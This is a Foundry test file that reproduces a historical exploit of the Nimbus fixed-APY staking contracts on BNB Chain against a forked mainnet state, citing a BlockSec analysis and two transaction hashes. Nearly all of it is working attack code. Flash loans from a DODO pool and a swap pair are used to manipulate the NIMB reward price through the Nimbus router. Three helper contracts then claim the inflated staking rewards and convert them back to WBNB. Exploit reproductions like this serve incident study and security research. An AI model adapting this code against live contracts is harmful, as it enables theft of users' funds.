// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1602877048124735489
// @TX
// https://bscscan.com/tx/0x7d2d8d2cda2d81529e0e0af90c4bfb39b6e74fa363c60b031d719dd9d153b012
// https://bscscan.com/tx/0x42f56d3e86fb47e1edffa59222b33b73e7407d4b5bb05e23b83cb1771790f6c1

interface NimbusBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface StakingRewardFixedAPY is IERC20 {
    function stake(uint256 amount) external;
    function getReward() external;
    function withdraw() external;
    function earned(address account) external view returns (uint256);
}

interface LockStakingRewardFixedAPY {
    function stake(uint256 amount) external;
    function getReward() external;
    function earned(address account) external view returns (uint256);
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    IERC20 NIMB = IERC20(0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB);
    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);
    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);
    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);
    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);
    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    uint256 flashLoanAmount;
    uint256 flashSwapAmount;
    User1 public user1;
    User2 public user2;
    User3 public user3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_639_507);
    }

    function testExploit() public {
        user1 = new User1();
        user2 = new User2();
        user3 = new User3();
        NBU_WBNB.deposit{value: 20 ether}();
        NBU_WBNB.transfer(address(user1), 16 ether);
        NBU_WBNB.transfer(address(user2), 2 ether);
        NBU_WBNB.transfer(address(user3), 2 ether);
        user1.stake();
        user2.stake();
        user3.stake();
        cheats.warp(block.timestamp + 8 * 24 * 60 * 60);
        flashLoanAmount = WBNB.balanceOf(dodo);
        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        flashSwapAmount = WBNB.balanceOf(address(Pair)) - 1e18;
        Pair.swap(flashSwapAmount, 0, address(this), new bytes(1));
        WBNB.transfer(dodo, flashLoanAmount);
    }

    function BiswapCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        payable(address(0)).transfer(address(this).balance);
        WBNB.withdraw(WBNB.balanceOf(address(this)));
        NBU_WBNB.deposit{value: address(this).balance}();
        NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(NBU_WBNB);
        path[1] = address(NIMB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        ); // Reward Price Manipulation
        user1.getReward();
        // GNIMB.transfer(address(stakingReward1), stakingReward1.balanceOf(address(user1)) - GNIMB.balanceOf(address(stakingReward1)));
        // user1.withdraw();
        GNIMB.transfer(
            address(stakingReward2), stakingReward2.earned(address(user2)) - GNIMB.balanceOf(address(stakingReward2))
        );
        user2.getReward();
        GNIMB.transfer(
            address(stakingReward3), stakingReward3.earned(address(user3)) - GNIMB.balanceOf(address(stakingReward3))
        );
        user3.getReward();
        NIMB.approve(address(NimbusRouter), type(uint256).max);
        path[0] = address(NIMB);
        path[1] = address(NBU_WBNB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NIMB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        GNIMBToNBU_WBNB();
        NBU_WBNB.withdraw(NBU_WBNB.balanceOf(address(this)));
        address(WBNB).call{value: address(this).balance}("");
        WBNB.transfer(address(Pair), flashSwapAmount * 1000 / 998 + 1000);
    }

    function GNIMBToNBU_WBNB() internal {
        GNIMB.approve(address(NimbusRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GNIMB);
        path[1] = address(NBU_WBNB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GNIMB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}

contract User1 is Test {
    address Owner;
    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);
    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);
    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);

    constructor() {
        Owner = msg.sender;
    }

    function stake() external {
        NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(NBU_WBNB);
        path[1] = address(GNIMB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        GNIMB.approve(address(stakingReward1), type(uint256).max);
        stakingReward1.stake(GNIMB.balanceOf(address(this)));
    }

    function getReward() external {
        deal(address(GNIMB), address(stakingReward1), 13_855_114 * 1e18);
        stakingReward1.getReward();
        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));
    }

    // function withdraw() external{
    //     stakingReward1.withdraw();
    //     GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));
    // }
}

contract User2 {
    address Owner;
    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);
    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);
    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);

    constructor() {
        Owner = msg.sender;
    }

    function stake() external {
        NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(NBU_WBNB);
        path[1] = address(GNIMB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        GNIMB.approve(address(stakingReward2), type(uint256).max);
        stakingReward2.stake(GNIMB.balanceOf(address(this)));
    }

    function getReward() external {
        stakingReward2.getReward();
        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));
    }
}

contract User3 {
    address Owner;
    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);
    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);
    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);
    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);

    constructor() {
        Owner = msg.sender;
    }

    function stake() external {
        NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(NBU_WBNB);
        path[1] = address(GNIMB);
        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        GNIMB.approve(address(stakingReward3), type(uint256).max);
        stakingReward3.stake(GNIMB.balanceOf(address(this)));
    }

    function getReward() external {
        stakingReward3.getReward();
        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));
    }
}
